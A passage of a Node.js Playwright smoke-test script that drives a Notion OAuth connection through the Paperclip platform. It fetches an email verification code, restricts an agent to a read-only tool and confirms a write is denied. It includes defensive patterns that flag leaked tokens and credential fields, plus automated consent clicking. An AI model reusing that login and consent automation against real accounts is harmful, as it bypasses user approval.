#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { mkdir, writeFile } from "node:fs/promises";
import path from "node:path";
import {
  assertAutomaticRegistrationSource,
  assertSanitizedEvidence,
  connectionRemovalFacts,
  extractNotionIdentity,
  extractNotionVerificationCode,
  fetchNotionTestCredentials,
  inspectAuthorizationUrl,
  isFreshNotionVerificationMessage,
  NotionGenericLivePreflightError,
  notionVerificationAuthenticationPassed,
  parseRuntimeAbsenceProof,
  parseSanitizedAgentProof,
  persistedOAuthStartResult,
  preflightFailureMessage,
  prepareNotionGenericLiveSmoke,
  safeEndpointSummary,
} from "./notion-generic-live-lib.mjs";

const TARGET_COMPANY_PREFIX = "PAP";
const TARGET_AGENT_NAME = "CodexCoderPro";
const NOTION_RESOURCE = "https://mcp.notion.com/mcp";
const NOTION_GET_SELF = "notion-get-self";
const NOTION_CREATE_PAGES = "notion-create-pages";
const DEFAULT_AGENT_TIMEOUT_MS = 15 * 60_000;
const DEFAULT_VERIFICATION_TIMEOUT_MS = 2 * 60_000;

class SmokeFailure extends Error {
  constructor(checkpoint, code) {
    super(`${checkpoint}:${code}`);
    this.name = "SmokeFailure";
    this.checkpoint = checkpoint;
    this.code = code;
  }
}

function fail(checkpoint, code) {
  throw new SmokeFailure(checkpoint, code);
}

function asArray(value, key) {
  if (Array.isArray(value)) return value;
  if (value && typeof value === "object" && Array.isArray(value[key])) return value[key];
  return [];
}

function escapeRegex(value) {
  return value.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

function screenshotFile(outputDirectory, name) {
  return path.join(outputDirectory, name);
}

function assertNoCredentialMaterial(value, credentials, checkpoint) {
  const serialized = JSON.stringify(value);
  for (const credential of credentials) {
    if (credential && serialized.includes(credential)) fail(checkpoint, "credential_material_visible");
  }
  if (/[?&](?:code|state|access_token|refresh_token)=/i.test(serialized)) {
    fail(checkpoint, "oauth_query_material_visible");
  }
  const forbiddenValueKey = /^(?:password|accessToken|access_token|refreshToken|refresh_token|oauthCode|oauth_code|clientSecret|client_secret|cookie|authorizationHeader)$/i;
  const visit = (candidate, seen = new Set()) => {
    if (!candidate || typeof candidate !== "object" || seen.has(candidate)) return;
    seen.add(candidate);
    for (const [key, child] of Object.entries(candidate)) {
      if (forbiddenValueKey.test(key) && child !== null && child !== "") {
        fail(checkpoint, "raw_credential_field_visible");
      }
      visit(child, seen);
    }
  };
  visit(value);
}

function issueMutationHeaders(config, method, pathname) {
  if (method === "GET" || !pathname.startsWith("/api/issues/")) return {};
  return { "X-Paperclip-Run-Id": config.runId };
}

async function apiJson(request, config, method, pathname, data, checkpoint, expectedStatuses = [200]) {
  let response;
  try {
    response = await request.fetch(new URL(pathname, config.baseUrl).toString(), {
      method,
      ...(data === undefined ? {} : { data }),
      headers: {
        accept: "application/json",
        ...(method === "GET" ? {} : { origin: config.baseUrl }),
        ...issueMutationHeaders(config, method, pathname),
      },
      timeout: 30_000,
    });
  } catch {
    fail(checkpoint, "request_failed");
  }
  if (!expectedStatuses.includes(response.status())) {
    fail(checkpoint, `http_${response.status()}`);
  }
  try {
    return await response.json();
  } catch {
    fail(checkpoint, "invalid_json");
  }
}

async function waitFor(checkpoint, fn, { timeoutMs = 120_000, intervalMs = 2_000 } = {}) {
  const deadline = Date.now() + timeoutMs;
  let lastValue;
  while (Date.now() < deadline) {
    lastValue = await fn();
    if (lastValue) return lastValue;
    await new Promise((resolve) => setTimeout(resolve, intervalMs));
  }
  fail(checkpoint, "timed_out");
  return lastValue;
}

async function expectVisible(locator, checkpoint, code, timeout = 30_000) {
  try {
    await locator.waitFor({ state: "visible", timeout });
  } catch {
    fail(checkpoint, code);
  }
}

async function gotoWithVisibleMarker(
  page,
  url,
  marker,
  checkpoint,
  code,
  { attempts = 2, timeout = 15_000 } = {},
) {
  for (let attempt = 1; attempt <= attempts; attempt += 1) {
    try {
      const response = await page.goto(url, { waitUntil: "domcontentloaded" });
      if (response?.ok()) {
        await marker().waitFor({ state: "visible", timeout });
        return;
      }
    } catch {
      // A credential-free Paperclip navigation is safe to repeat once. Do not
      // retry provider pages or any mutation from this helper.
    }
    if (attempt < attempts) await page.waitForTimeout(500);
  }
  fail(checkpoint, code);
}

async function loginPaperclipBoard(page, context, config) {
  const loginUrl = new URL("/auth?next=/", config.baseUrl).toString();
  for (let attempt = 1; attempt <= 2; attempt += 1) {
    await gotoWithVisibleMarker(
      page,
      loginUrl,
      () => page.getByLabel(/^email$/i),
      "A.paperclip-login",
      "email_field_missing",
    );
    const paperclipEmailInput = page.getByLabel(/^email$/i);
    const paperclipPasswordInput = page.getByLabel(/^password$/i);
    await expectVisible(paperclipPasswordInput, "A.paperclip-login", "password_field_missing");
    await paperclipEmailInput.fill(config.paperclipEmail);
    await paperclipPasswordInput.fill(config.paperclipPassword);
    const loginResponsePromise = page.waitForResponse((response) =>
      response.request().method() === "POST" && new URL(response.url()).pathname === "/api/auth/sign-in/email",
    );
    await page.getByRole("button", { name: /^sign in$/i }).click();
    const loginResponse = await loginResponsePromise;
    if (!loginResponse.ok()) fail("A.paperclip-login", `http_${loginResponse.status()}`);

    // A redirect is a UI implementation detail; the authenticated session is
    // the prerequisite the smoke actually needs. A successful sign-in response
    // without a usable cookie has occurred intermittently through public dev
    // proxies, so verify the cookie and repeat the idempotent sign-in once.
    const session = await context.request.get(new URL("/api/auth/get-session", config.baseUrl).toString(), {
      headers: { accept: "application/json" },
    });
    if (session.ok()) return;
    if (attempt < 2) await page.waitForTimeout(500);
  }
  fail("A.paperclip-login", "session_cookie_missing");
}

async function clickVisibleButton(page, names) {
  for (const name of names) {
    const button = page.getByRole("button", { name, exact: false }).filter({ visible: true }).first();
    if (!await button.count()) continue;
    try {
      await button.click({ timeout: 2_000 });
      return true;
    } catch {
      // Provider pages replace controls while advancing between login steps.
    }
  }
  return false;
}

function verificationTimeoutMs() {
  const configured = Number(process.env.NOTION_VERIFICATION_TIMEOUT_MS || DEFAULT_VERIFICATION_TIMEOUT_MS);
  return Number.isFinite(configured)
    ? Math.min(Math.max(configured, 30_000), 5 * 60_000)
    : DEFAULT_VERIFICATION_TIMEOUT_MS;
}

async function fetchNotionVerificationCodeFromAgentMail({ notBefore }) {
  const apiKey = process.env.AGENTMAIL_API_KEY?.trim();
  const inboxId = process.env.NOTION_AGENTMAIL_INBOX_ID?.trim();
  if (!apiKey || !inboxId) fail("C.notion-login", "verification_inbox_unavailable");

  let AgentMailClient;
  try {
    ({ AgentMailClient } = await import("agentmail"));
  } catch {
    fail("C.notion-login", "agentmail_sdk_unavailable");
  }
  const client = new AgentMailClient({ apiKey });
  try {
    const inbox = await client.inboxes.get(inboxId);
    if (inbox.inboxId !== inboxId && inbox.email !== inboxId) {
      fail("C.notion-login", "verification_inbox_mismatch");
    }
  } catch (error) {
    if (error instanceof SmokeFailure) throw error;
    fail("C.notion-login", "verification_inbox_request_failed");
  }

  const deadline = Date.now() + verificationTimeoutMs();
  const after = new Date(new Date(notBefore).getTime() - 5_000);
  while (Date.now() < deadline) {
    try {
      let pageToken;
      let inspected = 0;
      do {
        const response = await client.inboxes.messages.list(inboxId, {
          limit: 50,
          after,
          ...(pageToken ? { pageToken } : {}),
        });
        for (const item of response.messages) {
          inspected += 1;
          if (!isFreshNotionVerificationMessage(item, { notBefore: after })) continue;
          const message = await client.inboxes.messages.get(inboxId, item.messageId);
          if (!notionVerificationAuthenticationPassed(message)) continue;
          const code = extractNotionVerificationCode(message);
          if (code) return code;
        }
        pageToken = response.nextPageToken;
      } while (pageToken && inspected < 100);
    } catch (error) {
      if (error instanceof SmokeFailure) throw error;
      fail("C.notion-login", "verification_inbox_request_failed");
    }
    await new Promise((resolve) => setTimeout(resolve, 2_000));
  }
  fail("C.notion-login", "verification_code_timed_out");
}

async function completeNotionAuthorization(page, config, credential, connectionId) {
  const paperclipOrigin = new URL(config.baseUrl).origin;
  const permissionsPath = `/${TARGET_COMPANY_PREFIX}/apps/${connectionId}/permissions`;
  const deadline = Date.now() + 6 * 60_000;
  const verificationNotBefore = new Date();
  let providerSeen = false;
  let verificationCodeSubmitted = false;
  while (Date.now() < deadline) {
    let current;
    try {
      current = new URL(page.url());
    } catch {
      fail("C.oauth-callback", "invalid_navigation_url");
    }
    if (current.origin === paperclipOrigin) {
      if (providerSeen && current.pathname === permissionsPath) return;
      await page.waitForTimeout(300);
      continue;
    }
    providerSeen = true;

    const bodyText = await page.locator("body").innerText().catch(() => "");
    if (/check your (?:email|inbox)|verification code|one-time code/i.test(bodyText)) {
      if (verificationCodeSubmitted) fail("C.notion-login", "verification_code_rejected");
      const codeInput = page.locator([
        'input[autocomplete="one-time-code"]',
        'input[name*="code" i]',
        'input[inputmode="numeric"]',
      ].join(",")).filter({ visible: true }).first();
      if (!await codeInput.count()) {
        await page.waitForTimeout(300);
        continue;
      }
      let code = await fetchNotionVerificationCodeFromAgentMail({ notBefore: verificationNotBefore });
      await codeInput.fill(code);
      code = "";
      if (!await clickVisibleButton(page, [/^verify$/i, /^continue$/i, /^submit$/i, /^sign in$/i])) {
        await codeInput.press("Enter");
      }
      verificationCodeSubmitted = true;
      await page.waitForTimeout(600);
      continue;
    }

    const usernameInput = page.locator([
      'input[type="email"]',
      'input[name="email"]',
      'input[name="username"]',
      'input[autocomplete="username"]',
    ].join(",")).filter({ visible: true }).first();
    if (await usernameInput.count()) {
      const currentValue = await usernameInput.inputValue().catch(() => "");
      if (!currentValue) await usernameInput.fill(credential.username);
    }

    const passwordInput = page.locator([
      'input[type="password"]',
      'input[name="password"]',
      'input[autocomplete="current-password"]',
    ].join(",")).filter({ visible: true }).first();
    if (await passwordInput.count()) {
      const currentValue = await passwordInput.inputValue().catch(() => "");
      if (!currentValue) await passwordInput.fill(credential.password);
      await clickVisibleButton(page, [/^sign in$/i, /^log in$/i, /^continue$/i]);
    } else if (await usernameInput.count()) {
      await clickVisibleButton(page, [/continue with email/i, /^continue$/i, /^next$/i, /^sign in$/i]);
    } else {
      await clickVisibleButton(page, [
        /^authorize$/i,
        /^allow$/i,
        /allow access/i,
        /^approve$/i,
        /^grant access$/i,
        /^accept$/i,
        /^continue$/i,
        /^select$/i,
      ]);
    }
    await page.waitForTimeout(600);
  }
  fail("C.oauth-callback", "provider_authorization_timed_out");
}

async function safeScreenshot(page, outputPath, config, credential, checkpoint) {
  const current = new URL(page.url());
  if (current.origin !== new URL(config.baseUrl).origin) fail(checkpoint, "screenshot_not_on_paperclip");
  for (const queryKey of ["code", "state", "token", "access_token", "refresh_token"]) {
    if (current.searchParams.has(queryKey)) fail(checkpoint, "credential_query_in_screenshot_url");
  }
  const bodyText = await page.locator("body").innerText();
  if (bodyText.includes(config.paperclipPassword)
    || bodyText.includes(credential.password)
    || /[?&](?:code|state|access_token|refresh_token)=/i.test(bodyText)) {
    fail(checkpoint, "credential_material_in_screenshot");
  }
  await page.screenshot({
    path: outputPath,
    fullPage: true,
    animations: "disabled",
    mask: [
      page.getByText(config.paperclipEmail, { exact: false }),
      page.getByText(credential.username, { exact: false }),
    ],
  });
}

function assertGenericProvenance(connectResult, connectionName) {
  if (connectResult?.application?.name !== connectionName) fail("B.generic-provenance", "application_name_mismatch");
  if (!String(connectResult?.application?.applicationKey ?? "").startsWith("app-gallery:link:")) {
    fail("B.generic-provenance", "application_key_not_generic");
  }
  if (connectResult?.application?.metadata?.source !== "link") fail("B.generic-provenance", "metadata_source_not_link");
  const config = connectResult?.connection?.config;
  if (connectResult?.connection?.transport !== "mcp_remote"
    || config?.url !== NOTION_RESOURCE
    || config?.unverifiedServer !== true
    || config?.galleryKey === "notion"
    || config?.sourceTemplateKey === "notion") {
    fail("B.generic-provenance", "connection_not_unverified_generic");
  }
}

function oauthEndpointProof(connection, startResult, config) {
  const source = assertAutomaticRegistrationSource(startResult.registrationSource);
  const oauth = connection?.config?.oauth;
  if (!oauth || typeof oauth !== "object" || Array.isArray(oauth)) fail("C.oauth-proof", "oauth_config_missing");
  if (connection.authKind !== "oauth" || oauth.clientRegistrationSource !== source) {
    fail("C.oauth-proof", "registration_source_not_persisted");
  }
  if (oauth.resource !== NOTION_RESOURCE || startResult.resource !== NOTION_RESOURCE) {
    fail("C.oauth-proof", "resource_mismatch");
  }
  if (oauth.clientRedirectUri !== config.callbackUrl) fail("C.oauth-proof", "client_callback_mismatch");
  if (source === "cimd" && oauth.clientIdMetadataDocumentSupported !== true) {
    fail("C.oauth-proof", "cimd_support_not_persisted");
  }
  const endpoints = {
    issuer: safeEndpointSummary(oauth.issuer, "issuer"),
    metadata: safeEndpointSummary(oauth.metadataUrl, "metadata"),
    authorize: safeEndpointSummary(oauth.authorizationUrl, "authorize"),
    exchange: safeEndpointSummary(oauth.tokenUrl, "exchange"),
    ...(oauth.registrationUrl ? { registration: safeEndpointSummary(oauth.registrationUrl, "registration") } : {}),
  };
  return { source, endpoints };
}

function catalogFacts(catalog, checkpoint) {
  const active = catalog.filter((entry) => entry.status !== "removed");
  const getSelf = active.find((entry) => entry.toolName === NOTION_GET_SELF);
  const createPages = active.find((entry) => entry.toolName === NOTION_CREATE_PAGES);
  if (!getSelf || !getSelf.isReadOnly) fail(checkpoint, "notion_get_self_missing_or_not_read_only");
  if (!createPages || createPages.isReadOnly) fail(checkpoint, "notion_create_pages_missing_or_not_write");
  return { active, getSelf, createPages };
}

async function finishAgentOnlySetup(request, config, companyId, connectionId, catalog, agentId) {
  const facts = catalogFacts(catalog, "D.catalog-policy");
  await apiJson(
    request,
    config,
    "POST",
    `/api/companies/${companyId}/tools/apps/${connectionId}/finish`,
    {
      enabledCatalogEntryIds: [facts.getSelf.id],
      askFirstCatalogEntryIds: [],
      reviewedCatalogEntryIds: facts.active
        .filter((entry) => entry.status === "quarantined")
        .map((entry) => entry.id),
      access: { agentIds: [agentId] },
    },
    "D.catalog-policy",
  );
  await apiJson(
    request,
    config,
    "PUT",
    `/api/tool-connections/${connectionId}/installs`,
    { installs: [{ targetType: "agent", targetId: agentId }] },
    "D.agent-install",
  );
  return facts;
}

async function createAndWaitForProofIssue(request, config, input, checkpoint) {
  const child = await apiJson(
    request,
    config,
    "POST",
    `/api/issues/${config.taskId}/children`,
    input,
    `${checkpoint}.create`,
    [201],
  );
  if (child.status !== "todo") fail(`${checkpoint}.create`, "child_not_created_todo");
  const observedStatuses = new Set(["todo"]);
  const finished = await waitFor(`${checkpoint}.run`, async () => {
    const issue = await apiJson(request, config, "GET", `/api/issues/${child.id}`, undefined, `${checkpoint}.run`);
    observedStatuses.add(issue.status);
    if (["blocked", "cancelled"].includes(issue.status)) fail(`${checkpoint}.run`, `child_${issue.status}`);
    return issue.status === "done" ? issue : null;
  }, {
    timeoutMs: Number(process.env.NOTION_AGENT_TIMEOUT_MS || DEFAULT_AGENT_TIMEOUT_MS),
    intervalMs: 3_000,
  });
  if (!finished.startedAt || !finished.completedAt) fail(`${checkpoint}.run`, "transition_timestamps_missing");
  const commentsResponse = await apiJson(
    request,
    config,
    "GET",
    `/api/issues/${child.id}/comments`,
    undefined,
    `${checkpoint}.comment`,
  );
  return { child, finished, observedStatuses, comments: asArray(commentsResponse, "comments") };
}

async function cleanupConnection(
  request,
  config,
  companyId,
  connectionId,
  connectionName,
  { requireInstalled = false } = {},
) {
  const removed = await apiJson(
    request,
    config,
    "DELETE",
    `/api/tool-connections/${connectionId}`,
    undefined,
    "F.cleanup",
  );
  const receipt = removed.removal;
  const removalFacts = connectionRemovalFacts(receipt, { requireInstalled });
  if (!removalFacts) fail("F.cleanup", "incomplete_removal_receipt");

  const connections = await apiJson(
    request,
    config,
    "GET",
    `/api/companies/${companyId}/tools/connections`,
    undefined,
    "F.cleanup-verification",
  );
  if (asArray(connections, "connections").some((candidate) =>
    candidate.id === connectionId
    && candidate.name === connectionName
    && candidate.status !== "archived")) {
    fail("F.cleanup-verification", "test_connection_remains");
  }
  const profiles = await apiJson(
    request,
    config,
    "GET",
    `/api/companies/${companyId}/tools/profiles`,
    undefined,
    "F.cleanup-verification",
  );
  if (asArray(profiles, "profiles").some((profile) => profile.profileKey === `app:${connectionId}` && profile.status === "active")) {
    fail("F.cleanup-verification", "active_profile_remains");
  }
  const pending = await apiJson(
    request,
    config,
    "GET",
    `/api/companies/${companyId}/tools/action-requests?status=pending`,
    undefined,
    "F.cleanup-verification",
  );
  if (asArray(pending, "actionRequests").some((item) => (item.connectionId ?? item.request?.connectionId) === connectionId)) {
    fail("F.cleanup-verification", "pending_action_remains");
  }
  return {
    completed: true,
    ...removalFacts,
    pendingActions: 0,
    remainingConnections: 0,
  };
}

async function runSmoke({ config, chromium }) {
  const startedAt = new Date();
  const runKey = startedAt.toISOString().replace(/[:.]/g, "-");
  const connectionName = `Notion generic self-test ${startedAt.toISOString()}`;
  const outputDirectory = process.env.NOTION_EVIDENCE_DIR
    ? path.resolve(process.env.NOTION_EVIDENCE_DIR)
    : path.join(process.env.PAPERCLIP_RUN_SCRATCH_DIR || process.cwd(), `notion-generic-live-${runKey}`);
  await mkdir(outputDirectory, { recursive: true });

  const summary = {
    schemaVersion: 1,
    smoke: "notion_generic_mcp_live",
    passed: false,
    startedAt: startedAt.toISOString(),
    completedAt: null,
    target: { companyPrefix: TARGET_COMPANY_PREFIX, resource: NOTION_RESOURCE },
    importPreview: null,
    connection: null,
    oauthProof: null,
    catalog: null,
    boardTest: null,
    freshRun: null,
    cleanup: null,
    postCleanupRun: null,
    screenshots: [],
    failure: null,
  };

  let browser;
  let context;
  let credential = null;
  let connectionId = null;
  let companyId = null;
  let cleanupComplete = false;
  let caughtFailure = null;
  let activeCheckpoint = "A.paperclip-login";

  try {
    browser = await chromium.launch({ headless: process.env.NOTION_SMOKE_HEADED !== "1" });
    context = await browser.newContext({
      viewport: { width: 1440, height: 1000 },
      acceptDownloads: false,
      serviceWorkers: "block",
    });
    const page = await context.newPage();

    await loginPaperclipBoard(page, context, config);

    activeCheckpoint = "A.company-selection";
    const companies = await apiJson(context.request, config, "GET", "/api/companies", undefined, "A.company-selection");
    const company = asArray(companies, "companies").find((candidate) => candidate.issuePrefix === TARGET_COMPANY_PREFIX);
    if (!company) fail("A.company-selection", "pap_company_missing");
    companyId = company.id;
    activeCheckpoint = "A.agent-selection";
    const agents = await apiJson(
      context.request,
      config,
      "GET",
      `/api/companies/${companyId}/agents`,
      undefined,
      "A.agent-selection",
    );
    const agent = asArray(agents, "agents").find((candidate) => candidate.name === TARGET_AGENT_NAME);
    if (!agent) fail("A.agent-selection", "codex_coder_pro_missing");

    activeCheckpoint = "A.connection-isolation";
    const existingConnections = await apiJson(
      context.request,
      config,
      "GET",
      `/api/companies/${companyId}/tools/connections`,
      undefined,
      "A.connection-isolation",
    );
    const existingIds = new Set(asArray(existingConnections, "connections").map((entry) => entry.id));
    if (asArray(existingConnections, "connections").some((entry) => entry.name === connectionName && entry.status !== "archived")) {
      fail("A.connection-isolation", "connection_name_collision");
    }

    // Fetch only after URL, health, Paperclip login, company, agent, and binding
    // metadata have all passed. The value remains in this process and is never
    // written to browser artifacts or command arguments.
    activeCheckpoint = "A.secret-binding";
    credential = await fetchNotionTestCredentials(config);

    activeCheckpoint = "B.paste-config";
    await gotoWithVisibleMarker(
      page,
      new URL(`/${TARGET_COMPANY_PREFIX}/apps/advanced/paste-config`, config.baseUrl).toString(),
      () => page.getByRole("heading", { name: "Advanced setup", exact: true }),
      "B.paste-config",
      "advanced_setup_missing",
    );
    const configTextarea = page.locator("textarea").first();
    await expectVisible(configTextarea, "B.paste-config", "config_textarea_missing");
    const exactConfig = JSON.stringify({ mcpServers: { notion: { url: NOTION_RESOURCE } } }, null, 2);
    await configTextarea.fill(exactConfig);
    const importResponsePromise = page.waitForResponse((response) =>
      response.request().method() === "POST"
      && new URL(response.url()).pathname === `/api/companies/${companyId}/tools/mcp/import-json`,
    );
    await page.getByRole("button", { name: /^check config$/i }).click();
    const importResponse = await importResponsePromise;
    if (!importResponse.ok()) fail("B.import-preview", `http_${importResponse.status()}`);
    const preview = await importResponse.json().catch(() => fail("B.import-preview", "invalid_json"));
    const drafts = asArray(preview, "drafts");
    if (drafts.length !== 1
      || drafts[0].name !== "notion"
      || drafts[0].transport !== "mcp_remote"
      || drafts[0].config?.url !== NOTION_RESOURCE
      || drafts[0].credentialFields?.length !== 0
      || drafts[0].credentialRefs?.length !== 0) {
      fail("B.import-preview", "unexpected_draft");
    }
    const afterPreview = await apiJson(
      context.request,
      config,
      "GET",
      `/api/companies/${companyId}/tools/connections`,
      undefined,
      "B.import-preview",
    );
    if (asArray(afterPreview, "connections").some((entry) => !existingIds.has(entry.id))) {
      fail("B.import-preview", "preview_created_connection");
    }
    summary.importPreview = {
      draftCount: 1,
      name: "notion",
      transport: "mcp_remote",
      resource: NOTION_RESOURCE,
      credentialFieldCount: 0,
      credentialRefCount: 0,
    };

    activeCheckpoint = "B.generic-connect";
    const connectionNameInput = page.getByText("Connection name", { exact: true }).locator("input");
    await expectVisible(connectionNameInput, "B.generic-connect", "connection_name_input_missing");
    await connectionNameInput.fill(connectionName);
    const paperclipOrigin = new URL(config.baseUrl).origin;
    const authorizationRequestPromise = page.waitForRequest((request) => {
      if (!request.isNavigationRequest() || request.frame() !== page.mainFrame()) return false;
      try {
        const target = new URL(request.url());
        return target.protocol === "https:" && target.origin !== paperclipOrigin;
      } catch {
        return false;
      }
    }, { timeout: 90_000 });
    await page.getByRole("button", { name: /^check actions$/i }).click({ noWaitAfter: true });

    // `connect` returns the authorization URL inline, so the UI immediately
    // replaces this page with the provider. That navigation can abort a
    // Playwright response waiter even though the server committed successfully.
    // Persisted connection state is the durable evidence and gives cleanup the
    // ID before any provider credential entry.
    const createdConnection = await waitFor("B.generic-connect", async () => {
      const response = await apiJson(
        context.request,
        config,
        "GET",
        `/api/companies/${companyId}/tools/connections`,
        undefined,
        "B.generic-connect",
      );
      const matches = asArray(response, "connections").filter((candidate) =>
        candidate.name === connectionName && !existingIds.has(candidate.id) && candidate.status !== "archived");
      if (matches.length > 1) fail("B.generic-connect", "duplicate_connection_detected");
      return matches[0] ?? null;
    }, { timeoutMs: 90_000, intervalMs: 500 });
    connectionId = createdConnection.id;
    // Inspect the initial authorization request, not the provider's eventual
    // login page after redirects (which legitimately omits OAuth parameters).
    const authorizationRequest = await authorizationRequestPromise.catch(() =>
      fail("C.oauth-navigation", "authorization_navigation_missing"));
    const authorizationUrl = authorizationRequest.url();
    let connection = await apiJson(
      context.request,
      config,
      "GET",
      `/api/tool-connections/${connectionId}`,
      undefined,
      "B.generic-connect",
    );
    const applications = await apiJson(
      context.request,
      config,
      "GET",
      `/api/companies/${companyId}/tools/applications`,
      undefined,
      "B.generic-connect",
    );
    const applicationMatches = asArray(applications, "applications").filter((candidate) =>
      candidate.id === connection.applicationId && candidate.name === connectionName && candidate.status !== "archived");
    if (applicationMatches.length !== 1) fail("B.generic-connect", "application_not_unique");
    const application = applicationMatches[0];
    assertGenericProvenance({ application, connection }, connectionName);
    if (connection.authKind !== "oauth") fail("B.generic-connect", "oauth_challenge_missing");
    summary.connection = {
      id: connectionId,
      applicationId: application.id,
      name: connectionName,
      applicationKey: application.applicationKey,
      metadataSource: "link",
      transport: "mcp_remote",
      unverifiedServer: true,
      status: connection.status,
      healthStatus: connection.healthStatus,
    };

    const startResult = persistedOAuthStartResult(connection, authorizationUrl);
    if (!startResult) fail("C.oauth-start", "persisted_start_missing");
    if (startResult.connectionId !== connectionId) fail("C.oauth-start", "connection_id_changed");
    activeCheckpoint = "C.oauth-proof";
    const registrationSource = assertAutomaticRegistrationSource(startResult.registrationSource);
    const navigationProof = inspectAuthorizationUrl(startResult.authorizationUrl, {
      callbackUrl: config.callbackUrl,
      resource: NOTION_RESOURCE,
      registrationSource,
      baseUrl: config.baseUrl,
    });
    summary.oauthProof = {
      registrationSource,
      resource: NOTION_RESOURCE,
      callbackUriExact: true,
      pkceS256: true,
      statePresent: true,
      endpoint: navigationProof.endpoint,
      parameters: navigationProof.parameters,
      discoveredEndpoints: null,
    };

    // Registration source and every URL/PKCE/state invariant are checked before
    // the credential is entered into the provider page.
    activeCheckpoint = "C.notion-login";
    await completeNotionAuthorization(page, config, credential, connectionId);
    activeCheckpoint = "C.oauth-callback";
    const permissionsPath = `/${TARGET_COMPANY_PREFIX}/apps/${connectionId}/permissions`;
    await page.goto(new URL(permissionsPath, config.baseUrl).toString(), { waitUntil: "domcontentloaded" });
    await expectVisible(page.getByText("OAuth connected", { exact: true }), "C.oauth-callback", "connected_state_missing", 45_000);
    await expectVisible(page.getByText("Unverified server", { exact: true }), "C.oauth-callback", "unverified_badge_missing");

    connection = await apiJson(
      context.request,
      config,
      "GET",
      `/api/tool-connections/${connectionId}`,
      undefined,
      "C.connection-detail",
    );
    if (connection.name !== connectionName
      || connection.config?.unverifiedServer !== true
      || connection.config?.sourceTemplateKey === "notion"
      || connection.authKind !== "oauth") {
      fail("C.connection-detail", "generic_provenance_lost");
    }
    const endpointProof = oauthEndpointProof(connection, startResult, config);
    assertNoCredentialMaterial(connection, [config.paperclipPassword, credential.username, credential.password], "C.connection-detail");
    summary.connection = {
      id: connectionId,
      applicationId: connection.applicationId,
      name: connectionName,
      applicationKey: application.applicationKey,
      metadataSource: "link",
      transport: "mcp_remote",
      unverifiedServer: true,
      status: connection.status,
      healthStatus: connection.healthStatus,
    };
    summary.oauthProof = {
      registrationSource,
      resource: NOTION_RESOURCE,
      callbackUriExact: true,
      pkceS256: true,
      statePresent: true,
      endpoint: navigationProof.endpoint,
      parameters: navigationProof.parameters,
      discoveredEndpoints: endpointProof.endpoints,
    };
    const connectedShot = "01-generic-connected.png";
    await safeScreenshot(page, screenshotFile(outputDirectory, connectedShot), config, credential, "F.connected-screenshot");
    summary.screenshots.push(connectedShot);

    activeCheckpoint = "D.health-check";
    const health = await apiJson(
      context.request,
      config,
      "POST",
      `/api/tool-connections/${connectionId}/health-check`,
      {},
      "D.health-check",
    );
    if (health.connection?.healthStatus !== "healthy") fail("D.health-check", "connection_not_healthy");
    const refreshed = await apiJson(
      context.request,
      config,
      "POST",
      `/api/tool-connections/${connectionId}/catalog/refresh`,
      {},
      "D.catalog-refresh",
    );
    const catalog = asArray(refreshed, "catalog");
    const facts = await finishAgentOnlySetup(context.request, config, companyId, connectionId, catalog, agent.id);

    activeCheckpoint = "D.connection-active";
    connection = await apiJson(context.request, config, "GET", `/api/tool-connections/${connectionId}`, undefined, "D.connection-active");
    if (connection.status !== "active" || connection.healthStatus !== "healthy" || connection.config?.unverifiedServer !== true) {
      fail("D.connection-active", "connection_not_active_healthy_generic");
    }
    const uniqueConnections = await apiJson(
      context.request,
      config,
      "GET",
      `/api/companies/${companyId}/tools/connections`,
      undefined,
      "D.connection-active",
    );
    if (asArray(uniqueConnections, "connections").filter((candidate) => candidate.name === connectionName).length !== 1) {
      fail("D.connection-active", "duplicate_connection_detected");
    }
    const installs = await apiJson(
      context.request,
      config,
      "GET",
      `/api/tool-connections/${connectionId}/installs`,
      undefined,
      "D.agent-install",
    );
    const installRows = asArray(installs, "installs");
    if (installRows.length !== 1 || installRows[0].targetType !== "agent" || installRows[0].targetId !== agent.id) {
      fail("D.agent-install", "install_not_agent_only");
    }
    const testAgents = await apiJson(
      context.request,
      config,
      "GET",
      `/api/tool-connections/${connectionId}/test-agents`,
      undefined,
      "D.effective-policy",
    );
    const testAgent = asArray(testAgents, "agents").find((candidate) => candidate.id === agent.id);
    const getSelfAccess = testAgent?.effectiveAccess?.tools?.find((tool) => tool.toolName === NOTION_GET_SELF);
    const createPagesAccess = testAgent?.effectiveAccess?.tools?.find((tool) => tool.toolName === NOTION_CREATE_PAGES);
    if (getSelfAccess?.decision !== "allowed" || createPagesAccess?.decision !== "off") {
      fail("D.effective-policy", "unexpected_effective_decision");
    }
    const deniedWrite = await apiJson(
      context.request,
      config,
      "POST",
      `/api/tool-connections/${connectionId}/test-calls`,
      { agentId: agent.id, toolName: NOTION_CREATE_PAGES, parameters: {} },
      "D.write-denial",
    );
    if (deniedWrite.decision !== "off" || typeof deniedWrite.invocationId !== "string" || !deniedWrite.error) {
      fail("D.write-denial", "write_action_not_denied");
    }
    summary.catalog = {
      discoveredCount: refreshed.discoveredCount,
      advertisedReadTools: facts.active
        .filter((entry) => [NOTION_GET_SELF, "notion-get-users", "notion-fetch"].includes(entry.toolName))
        .map((entry) => entry.toolName),
      getSelf: { catalogEntryId: facts.getSelf.id, decision: "allowed" },
      createPages: {
        catalogEntryId: facts.createPages.id,
        decision: "off",
        localDenialInvocationId: deniedWrite.invocationId,
        upstreamSent: false,
      },
      accessAgentId: agent.id,
      installAgentId: agent.id,
      enabledCatalogEntryCount: 1,
      healthCheck: "healthy",
      catalogRefresh: "succeeded",
    };

    await page.goto(new URL(`/${TARGET_COMPANY_PREFIX}/apps/${connectionId}/permissions`, config.baseUrl).toString(), { waitUntil: "domcontentloaded" });
    await expectVisible(page.getByText("Who can use it", { exact: true }), "D.permissions-ui", "permissions_panel_missing");
    const getSelfPermission = page.locator(`[data-action-id="${facts.getSelf.id}"] select`);
    const createPagesPermission = page.locator(`[data-action-id="${facts.createPages.id}"] select`);
    await expectVisible(getSelfPermission, "D.permissions-ui", "get_self_permission_missing");
    await expectVisible(createPagesPermission, "D.permissions-ui", "create_pages_permission_missing");
    if (await getSelfPermission.inputValue() !== "allowed" || await createPagesPermission.inputValue() !== "off") {
      fail("D.permissions-ui", "permissions_ui_mismatch");
    }
    const permissionsShot = "02-read-only-policy.png";
    await safeScreenshot(page, screenshotFile(outputDirectory, permissionsShot), config, credential, "F.permissions-screenshot");
    summary.screenshots.push(permissionsShot);

    activeCheckpoint = "D.test-panel";
